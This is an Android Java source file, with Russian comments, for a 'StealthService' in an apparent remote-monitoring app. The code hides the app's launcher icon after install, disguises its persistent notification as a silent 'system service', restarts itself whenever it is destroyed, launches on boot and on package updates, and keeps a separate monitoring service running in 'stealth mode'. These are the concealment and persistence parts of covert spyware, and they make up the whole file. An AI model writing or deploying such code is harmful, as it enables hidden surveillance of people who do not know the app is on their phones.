package com.example.remotemonitor;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.core.app.NotificationCompat;

/**
 * Стелс сервис для постоянной работы в фоне
 * Автоматически запускается при загрузке системы
 * Скрывает приложение с рабочего стола после установки
 */
public class StealthService extends Service {
    
    private static final String TAG = "StealthService";
    private static final String CHANNEL_ID = "SystemServiceChannel";
    private static final int NOTIFICATION_ID = 1337;
    
    private Handler handler;
    private Runnable keepAliveRunnable;
    private BroadcastReceiver bootReceiver;
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "StealthService создан");
        
        createNotificationChannel();
        hideAppFromLauncher();
        setupKeepAlive();
        registerBootReceiver();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "StealthService запущен");
        
        // Запуск как foreground service с невидимым уведомлением
        startForeground(NOTIFICATION_ID, createStealthNotification());
        
        // Скрыть приложение после первого запуска
        hideAppFromLauncher();
        
        // Запустить основные сервисы мониторинга
        startMonitoringServices();
        
        // Возвращаем START_STICKY для автоматического перезапуска
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        
        if (handler != null && keepAliveRunnable != null) {
            handler.removeCallbacks(keepAliveRunnable);
        }
        
        if (bootReceiver != null) {
            try {
                unregisterReceiver(bootReceiver);
            } catch (Exception e) {
                Log.w(TAG, "Ошибка отмены регистрации receiver: " + e.getMessage());
            }
        }
        
        Log.i(TAG, "StealthService уничтожен - перезапуск...");
        
        // Немедленный перезапуск сервиса
        Intent restartIntent = new Intent(this, StealthService.class);
        startService(restartIntent);
    }
    
    /**
     * Создание канала уведомлений
     */
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Системные службы",
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setDescription("Системные фоновые службы");
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableVibration(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
    
    /**
     * Создание стелс уведомления
     */
    private Notification createStealthNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Системная служба")
                .setContentText("Фоновые процессы системы")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .setOngoing(true)
                .setSilent(true)
                .setShowWhen(false)
                .build();
    }
    
    /**
     * Скрытие приложения с рабочего стола
     */
    private void hideAppFromLauncher() {
        try {
            PackageManager packageManager = getPackageManager();
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
            
            Log.i(TAG, "Приложение скрыто с рабочего стола");
            
        } catch (Exception e) {
            Log.e(TAG, "Ошибка скрытия приложения: " + e.getMessage());
        }
    }
    
    /**
     * Настройка механизма keep-alive
     */
    private void setupKeepAlive() {
        handler = new Handler(Looper.getMainLooper());
        
        keepAliveRunnable = new Runnable() {
            @Override
            public void run() {
                // Проверка и перезапуск сервисов
                ensureServicesRunning();
                
                // Планировать следующую проверку через 30 секунд
                handler.postDelayed(this, 30000);
            }
        };
        
        // Запустить через 10 секунд после старта
        handler.postDelayed(keepAliveRunnable, 10000);
    }
    
    /**
     * Регистрация получателя загрузки системы
     */
    private void registerBootReceiver() {
        bootReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String action = intent.getAction();
                
                if (Intent.ACTION_BOOT_COMPLETED.equals(action) ||
                    Intent.ACTION_MY_PACKAGE_REPLACED.equals(action) ||
                    Intent.ACTION_PACKAGE_REPLACED.equals(action)) {
                    
                    Log.i(TAG, "Система загружена - запуск сервиса");
                    
                    Intent serviceIntent = new Intent(context, StealthService.class);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(serviceIntent);
                    } else {
                        context.startService(serviceIntent);
                    }
                }
            }
        };
        
        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_BOOT_COMPLETED);
        filter.addAction(Intent.ACTION_MY_PACKAGE_REPLACED);
        filter.addAction(Intent.ACTION_PACKAGE_REPLACED);
        filter.addDataScheme("package");
        
        registerReceiver(bootReceiver, filter);
    }
    
    /**
     * Запуск основных сервисов мониторинга
     */
    private void startMonitoringServices() {
        try {
            // Запуск основного сервиса мониторинга
            Intent monitoringIntent = new Intent(this, MonitoringService.class);
            monitoringIntent.putExtra("stealth_mode", true);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(monitoringIntent);
            } else {
                startService(monitoringIntent);
            }
            
            Log.i(TAG, "Сервисы мониторинга запущены в стелс режиме");
            
        } catch (Exception e) {
            Log.e(TAG, "Ошибка запуска сервисов мониторинга: " + e.getMessage());
        }
    }
    
    /**
     * Проверка работы сервисов
     */
    private void ensureServicesRunning() {
        try {
            // Проверить, что основной сервис мониторинга работает
            boolean monitoringRunning = isServiceRunning(MonitoringService.class);
            
            if (!monitoringRunning) {
                Log.w(TAG, "Сервис мониторинга не работает - перезапуск");
                startMonitoringServices();
            }
            
            // Обновить уведомление для поддержания foreground статуса
            NotificationManager notificationManager = 
                (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            
            if (notificationManager != null) {
                notificationManager.notify(NOTIFICATION_ID, createStealthNotification());
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Ошибка проверки сервисов: " + e.getMessage());
        }
    }
    
    /**
     * Проверка, работает ли сервис
     */
    private boolean isServiceRunning(Class<?> serviceClass) {
        try {
            android.app.ActivityManager manager = 
                (android.app.ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            
            if (manager != null) {
                for (android.app.ActivityManager.RunningServiceInfo service : 
                     manager.getRunningServices(Integer.MAX_VALUE)) {
                    
                    if (serviceClass.getName().equals(service.service.getClassName())) {
                        return true;
                    }
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "Ошибка проверки статуса сервиса: " + e.getMessage());
        }
        
        return false;
    }
    
    /**
     * Статический метод для запуска стелс сервиса
     */
    public static void startStealthMode(Context context) {
        try {
            Intent intent = new Intent(context, StealthService.class);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent);
            } else {
                context.startService(intent);
            }
            
            Log.i(TAG, "StealthService запущен из внешнего вызова");
            
        } catch (Exception e) {
            Log.e(TAG, "Ошибка запуска StealthService: " + e.getMessage());
        }
    }
}